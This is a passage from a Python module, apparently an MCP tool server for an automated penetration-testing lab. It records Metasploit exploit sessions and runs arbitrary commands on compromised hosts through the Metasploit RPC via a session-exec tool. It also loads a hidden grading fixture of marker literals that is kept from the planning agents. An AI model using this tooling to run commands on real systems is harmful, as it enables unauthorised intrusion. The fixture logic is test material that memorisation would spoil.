            parsed=parsed,
        )
    try:
        info = dict(client.sessions.list.get(session_id) or {})
    except Exception:  # noqa: BLE001
        info = {}
    parsed = _default_parsed()
    parsed["session_id"] = session_id
    parsed["entities"].append(
        {"type": "session", "session_id": session_id, "bound_target": rhost, "via_exploit": module_name}
    )
    parsed["runtime_hints"] = {
        "session_id": session_id,
        "open_session": True,
        "bound_target": rhost,
        "via_exploit": module_name,
        "session_type": _string(info.get("type")),
        "module": module_name,
    }
    parsed["writeback_hints"] = {"observation_category": "exploit_session"}
    return _payload(
        success=True,
        stdout=json.dumps({"session_id": session_id, "target": rhost, "type": info.get("type")}, ensure_ascii=True, sort_keys=True),
        parsed=parsed,
    )


def _session_exec(arguments: dict[str, Any]) -> dict[str, Any]:
    config = _load_msf_config()
    if config is None:
        return _payload(success=False, stderr="metasploit RPC is not configured", exit_code="msf_not_configured")
    session_id = _string(arguments.get("session_id"))
    command = _string(arguments.get("command"))
    argv = arguments.get("argv")
    if not command and isinstance(argv, list):
        command = " ".join(str(item) for item in argv)
    if not session_id or not command:
        return _payload(success=False, stderr="session_id and command/argv are required", exit_code="invalid_arguments")
    timeout = _int(arguments.get("timeout_seconds"), 30)
    try:
        client = _msf_client(config)
        shell = client.sessions.session(session_id)
        shell.write(command + "\n")
        time.sleep(min(max(timeout, 2), 10))
        output = shell.read()
    except Exception as exc:  # noqa: BLE001
        return _payload(success=False, stderr=f"session_exec failed: {exc}", exit_code="msf_session_error")
    parsed = _default_parsed()
    parsed["runtime_hints"] = {"session_id": session_id, "session_command_executed": True}
    return _payload(success=True, stdout=str(output)[:MAX_OUTPUT_CHARS], parsed=parsed)


def _lab_mode_enabled() -> bool:
    return os.getenv("AEGRA_LAB_MODE", "").strip().lower() in {"1", "true", "yes", "on"}


def load_hidden_fixture_from_env() -> dict[str, Any]:
    """Load the hidden MCP fixture without exposing it to Planner or Runtime.

    The fixture is consumed only inside MCP tool implementations. Tool responses
    may return booleans and generic evidence types derived from the fixture, but
    must never return credential secrets or marker literals.
    """

    global _HIDDEN_FIXTURE_CACHE
    fixture_path = _string(os.getenv("AEGRA_LAB_FIXTURE_PATH"))
    if fixture_path is None:
        return {}
    path = Path(fixture_path).expanduser().resolve()
    stat = path.stat()
    if (
        _HIDDEN_FIXTURE_CACHE is not None
        and _HIDDEN_FIXTURE_CACHE[0] == path
        and _HIDDEN_FIXTURE_CACHE[1] == stat.st_mtime
    ):
        return dict(_HIDDEN_FIXTURE_CACHE[2])
    text = path.read_text(encoding="utf-8")
    if path.suffix.lower() == ".json":
        payload = json.loads(text)
    else:
        try:
            import yaml  # type: ignore[import-not-found]
        except ImportError as exc:
            raise RuntimeError("PyYAML is required to load hidden YAML lab fixtures") from exc
        payload = yaml.safe_load(text)
    if payload is None:
        payload = {}
    if not isinstance(payload, dict):
        raise ValueError("hidden lab fixture must be a mapping")
    _HIDDEN_FIXTURE_CACHE = (path, stat.st_mtime, dict(payload))
    return dict(payload)


def _hidden_marker_check(arguments: dict[str, Any], response: dict[str, Any]) -> dict[str, Any] | None:
    marker_id = _string(arguments.get("fixture_marker_id"))
    if marker_id is None:
        return None
    marker_literal = _hidden_marker_literal(marker_id)
    matched = bool(marker_literal and marker_literal in str(response.get("body_excerpt") or ""))
    return {
        "type": "hidden_marker",
        "fixture_marker_id": marker_id,
        "evidence_type": "goal_check",
        "matched": matched,
        "passed": matched,
        "generic_reason": "hidden marker matched" if matched else "hidden marker did not match",
    }


def _hidden_marker_literal(marker_id: str) -> str | None:
    fixture = load_hidden_fixture_from_env()
    markers = fixture.get("markers")
    if isinstance(markers, dict):
        value = markers.get(marker_id)
        if isinstance(value, dict):
            return _string(value.get("literal") or value.get("value") or value.get("marker"))
        return _string(value)
    if isinstance(markers, list):
        for item in markers:
            if not isinstance(item, dict):
                continue
            item_id = _string(item.get("id") or item.get("marker_id") or item.get("name"))
            if item_id == marker_id:
                return _string(item.get("literal") or item.get("value") or item.get("marker"))
    return None


def _required(arguments: dict[str, Any], key: str) -> str:
    value = arguments.get(key)
    if value is None or str(value).strip() == "":
        raise ValueError(f"{key} is required")
    return str(value)


def _int(value: Any, default: int) -> int:
    try:
        return int(value)
    except (TypeError, ValueError):
        return default


def _limit(text: str, limit: int) -> str:
    return text[: max(0, limit)]


def _string_items(value: Any) -> list[str]:
    if value is None:
        return []
    items = value if isinstance(value, list) else [value]
    return [str(item).strip() for item in items if str(item).strip()]


def _string(value: Any) -> str | None:
    if value is None:
        return None
    text = str(value).strip()
    return text or None


def _safe_artifact_name(value: str) -> str:
    safe = re.sub(r"[^A-Za-z0-9_.-]+", "-", value).strip(".-")
    return safe[:80] or "artifact"


def _artifact_temp_path(name: str, suffix: str) -> Path:
    artifact_dir = Path(os.getenv("AEGRA_MCP_ARTIFACT_DIR", "var/mcp_artifacts")).resolve()
    artifact_dir.mkdir(parents=True, exist_ok=True)
    return artifact_dir / f"{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%S%fZ')}-{_safe_artifact_name(name)}{suffix}"


def _extract_title(html: str) -> str | None:
    match = re.search(r"<title[^>]*>(.*?)</title>", html, flags=re.IGNORECASE | re.DOTALL)
    if not match:
        return None
    return re.sub(r"\s+", " ", match.group(1)).strip()


__all__ = ["LAB_TOOL_SPECS", "call_lab_tool", "lab_tool_specs", "load_hidden_fixture_from_env"]
